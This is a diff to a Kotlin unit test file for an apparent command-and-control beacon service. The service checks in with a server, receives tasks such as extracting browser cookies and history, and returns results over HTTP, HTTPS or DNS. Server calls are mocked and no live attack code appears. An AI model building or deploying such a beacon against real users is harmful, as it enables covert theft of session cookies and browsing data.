@@ -10,6 +10,7 @@ import org.junit.Before
 import org.junit.Rule
 import org.junit.Test
 import org.mockito.kotlin.any
+import org.mockito.kotlin.argumentCaptor
 import org.mockito.kotlin.mock
 import org.mockito.kotlin.verify
 import org.mockito.kotlin.whenever
@@ -34,7 +35,6 @@ class RealBeaconServiceTest {
 
     @Test
     fun whenCheckInSucceedsThenReturnsTasksAsPendingCommands() = runTest {
-        // Arrange: server accepts check-in and has one pending task
         givenSuccessfulCheckIn()
         givenTasksResponse(
             listOf(
@@ -42,14 +42,22 @@ class RealBeaconServiceTest {
             ),
         )
 
-        // Act
         val result = testee.checkIn()
 
-        // Assert
         assertThat(result.commands.size, `is`(1))
         assertThat(result.commands[0].id, `is`("task-001"))
         assertThat(result.commands[0].type, `is`("request-cookies"))
-        assertThat(result.beaconInterval, `is`(2))
+        assertThat(result.beaconInterval, `is`(15))
+    }
+
+    @Test
+    fun whenCheckInSucceedsThenPopulatesCommunicationProtocol() = runTest {
+        givenSuccessfulCheckIn(protocol = "dns")
+        givenTasksResponse(emptyList())
+
+        val result = testee.checkIn()
+
+        assertThat(result.communicationProtocol, `is`("dns"))
     }
 
     @Test
@@ -88,7 +96,6 @@ class RealBeaconServiceTest {
 
         testee.checkIn()
 
-        // Verify check-in was called (device registers before polling)
         verify(mockApi).checkIn(any())
     }
 
@@ -99,7 +106,6 @@ class RealBeaconServiceTest {
 
         testee.checkIn()
 
-        // Verify task polling was called
         verify(mockApi).getTasks(any())
     }
 
@@ -119,37 +125,80 @@ class RealBeaconServiceTest {
     }
 
     // -----------------------------------------------------------------------
-    // sendResult() tests
+    // sendResult() — HTTP protocol
     // -----------------------------------------------------------------------
 
     @Test
-    fun whenSendResultCalledThenSubmitsToServer() = runTest {
-        whenever(mockApi.sendResult(any())).thenReturn(
-            Response.success(TaskResultResponse(status = "accepted", task_id = "task-001")),
-        )
+    fun whenSendResultHttpThenSubmitsToServer() = runTest {
+        givenSuccessfulSendResult()
 
-        testee.sendResult("task-001", "cookies extracted")
+        testee.sendResult("task-001", "request-cookies", "cookies extracted", "http")
 
         verify(mockApi).sendResult(any())
     }
 
+    @Test
+    fun whenSendResultHttpThenEncryptedFlagIsFalse() = runTest {
+        givenSuccessfulSendResult()
+        val captor = argumentCaptor<TaskResultRequest>()
+
+        testee.sendResult("task-001", "request-cookies", "data", "http")
+
+        verify(mockApi).sendResult(captor.capture())
+        assertThat(captor.firstValue.encrypted, `is`(false))
+    }
+
+    @Test
+    fun whenSendResultHttpsThenEncryptedFlagIsTrue() = runTest {
+        givenSuccessfulSendResult()
+        val captor = argumentCaptor<TaskResultRequest>()
+
+        testee.sendResult("task-001", "request-cookies", "data", "https")
+
+        verify(mockApi).sendResult(captor.capture())
+        assertThat(captor.firstValue.encrypted, `is`(true))
+    }
+
+    @Test
+    fun whenSendResultHttpsThenOutputIsNotPlaintext() = runTest {
+        givenSuccessfulSendResult()
+        val captor = argumentCaptor<TaskResultRequest>()
+
+        testee.sendResult("task-001", "request-cookies", "plain data", "https")
+
+        verify(mockApi).sendResult(captor.capture())
+        val output = captor.firstValue.data["output"] as String
+        assertThat(output == "plain data", `is`(false))
+    }
+
+    @Test
+    fun whenSendResultIncludesTaskType() = runTest {
+        givenSuccessfulSendResult()
+        val captor = argumentCaptor<TaskResultRequest>()
+
+        testee.sendResult("task-001", "request-history", "history data", "http")
+
+        verify(mockApi).sendResult(captor.capture())
+        assertThat(captor.firstValue.task_type, `is`("request-history"))
+    }
+
     @Test(expected = RuntimeException::class)
-    fun whenSendResultFailsThenExceptionPropagates() = runTest {
+    fun whenSendResultHttpFailsThenExceptionPropagates() = runTest {
         whenever(mockApi.sendResult(any())).thenThrow(RuntimeException("Connection refused"))
 
-        testee.sendResult("task-001", "result data")
+        testee.sendResult("task-001", "request-cookies", "result data", "http")
     }
 
     // -----------------------------------------------------------------------
     // Helpers
     // -----------------------------------------------------------------------
 
-    private suspend fun givenSuccessfulCheckIn() {
+    private suspend fun givenSuccessfulCheckIn(protocol: String = "http") {
         whenever(mockApi.checkIn(any())).thenReturn(
             CheckInResponse(
                 status = "registered",
-                beacon_interval = 2,
-                communication_protocol = "http",
+                beacon_interval = 15,
+                communication_protocol = protocol,
             ),
         )
     }
@@ -159,8 +208,14 @@ class RealBeaconServiceTest {
             TasksResponse(
                 device = "test-device",
                 tasks = tasks,
-                beacon_interval = 2,
+                beacon_interval = 15,
             ),
+        )
+    }
+
+    private suspend fun givenSuccessfulSendResult() {
+        whenever(mockApi.sendResult(any())).thenReturn(
+            Response.success(TaskResultResponse(status = "accepted", task_id = "task-001")),
         )
     }
 }
